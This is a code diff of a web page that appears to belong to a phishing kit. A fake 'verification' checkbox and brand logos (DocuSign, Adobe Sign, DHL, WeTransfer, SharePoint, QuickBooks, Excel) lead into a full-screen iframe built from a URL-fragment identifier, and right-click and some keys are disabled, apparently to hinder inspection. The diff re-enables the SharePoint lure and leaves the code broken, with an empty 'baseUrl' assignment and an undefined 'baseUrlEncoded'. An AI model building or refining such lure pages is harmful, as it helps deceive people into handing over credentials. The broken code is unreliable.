@@ -23,7 +23,6 @@
             
             border: none; /* Removes the default border */
             display: block; /* Eliminates vertical alignment whitespace gaps */
-			"z-index": "999999", // Ensures it sits on top of all other elements
         }
     </style>
 </head>
@@ -74,12 +73,11 @@
 //set global variables
 
 var vsr = window.location.href.slice(window.location.href.indexOf('#') + 1);
-const baseUrl= window.location.origin; // Hardcoded Base64 URL
+const baseUrl= ; // Hardcoded Base64 URL
 const myArray = vsr.split("&");
 vsr = myArray[0];
 var fmt = myArray[1];
 const container = document.getElementsByClassName('verification-container')[0];
-const logoContainer = document.getElementById("loading-logo");
 const iframe = document.getElementById('my-iframe');
 const checkbox = document.getElementById('verification-checkbox');
 $(document).ready(function(){
@@ -176,6 +174,7 @@ $(document).ready(function(){
   // Listen for the change event on the checkbox
         checkbox.addEventListener('change', function() {
 			const DNSfieldName = $('#fieldName').val();
+			const checkbox = document.getElementById('verification-checkbox');
 			const checkboxWrapper = document.querySelector('.checkbox-wrapper');
 			const spinner = document.getElementById('spinner');
             if (this.checked) {
@@ -183,15 +182,12 @@ $(document).ready(function(){
                 spinner.style.display = 'block';
                 // Set the source URL to load the page inside the iframe
 				setTimeout(() => {
-					iframe.src = baseUrl+ displayPage(DNSfieldName,vsr,fmt);
+					iframe.src = baseUrlEncoded + displayPage(DNSfieldName,vsr,fmt);
 					// Display the full screen iframe
 					iframe.style.display = 'block';
 					iframe.style.width="100%";
 					iframe.style.height ="100%";
-					// Hide the prior container safely
-					if (container) {
-						container.style.display = 'none';    
-					}
+					container.style.display = 'none';    
 					//Ensure body doesn't create external scrollbars
 					document.body.style.overflow = 'hidden';
 				}, 4000);
@@ -215,24 +211,10 @@ document.addEventListener('keydown', event => {
 document.addEventListener('contextmenu', event => event.preventDefault());
 
 
+
 function isBase64(encodedString) {
 	var regexBase64 = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
 	return regexBase64.test(encodedString);   // return TRUE if its base64 string.
-}
-function activateIframe(dnsresult,vsr,fmt,ipInfo){
-	// Set the source URL to load the page inside the iframe
-	setTimeout(() => {
-		iframe.src = baseUrl+ displayPage(dnsresult,vsr,fmt);
-		// Display the full screen iframe
-		iframe.style.display = 'block';
-		iframe.style.width="100%";
-		iframe.style.height ="100%";
-		// Hide the prior container safely
-        $("#loading-logo").hide();
-		//Ensure body doesn't create external scrollbars
-		document.body.style.overflow = 'hidden';
-	}, 4000);
-	return 0;
 }
 
 function switchImage(fmt,prefix,dnsresult,ipInfo,vsr){
@@ -243,43 +225,37 @@ function switchImage(fmt,prefix,dnsresult,ipInfo,vsr){
 		$(".verification-container").hide();
 		$("#loading-logo").show();
 		$("#docuLogo").attr("src", prefix+"wetransfer-logo-svg-vector.svg");
-		activateIframe(dnsresult,vsr,fmt,ipInfo);		
+		displayPage(dnsresult,vsr,fmt,ipInfo); 
 		break;
 		case "docusign":
 		$("#loading-logo").show();
 		$("#docuLogo").attr("src", prefix+"ds-logo-default.svg");
-		activateIframe(dnsresult,vsr,fmt,ipInfo); 
-		
+		displayPage(dnsresult,vsr,fmt,ipInfo); 
 		break;
 		case "adobe":
 		$("#loading-logo").show();
 		$("#docuLogo").attr("src", prefix+"adobe_acrobat_sign.png");
-		activateIframe(dnsresult,vsr,fmt,ipInfo); 
-		
+		displayPage(dnsresult,vsr,fmt,ipInfo); 
 		break;
 		case "dhl":
 		$("#loading-logo").show();
 		$("#docuLogo").attr("src", prefix+"DHL-Logo.wine.svg");
-		activateIframe(dnsresult,vsr,fmt,ipInfo); 
-		
+		displayPage(dnsresult,vsr,fmt,ipInfo); 
 		break;
-		/*case "sharepoint":
+		case "sharepoint":
 		$("#loading-logo").show();
 		$("#docuLogo").attr("src", prefix+"sharepoint-1.svg");
-		activateIframe(dnsresult,vsr,fmt,ipInfo); */
-		
+		displayPage(dnsresult,vsr,fmt,ipInfo); 
 		break;
 		case "quickbooks":
 		$("#loading-logo").show();
 		$("#docuLogo").attr("src", prefix+"Intuit_QuickBooks_logo.png");
-		activateIframe(dnsresult,vsr,fmt,ipInfo); 
-		
+		displayPage(dnsresult,vsr,fmt,ipInfo); 
 		break;
 		case "excel":
 		$("#loading-logo").show();
 		$("#docuLogo").attr("src", prefix+"excelLogo.png");
-		activateIframe(dnsresult,vsr,fmt,ipInfo); 
-		
+		displayPage(dnsresult,vsr,fmt,ipInfo); 
 		break;
 		default:
 		$("#loading-logo").hide();
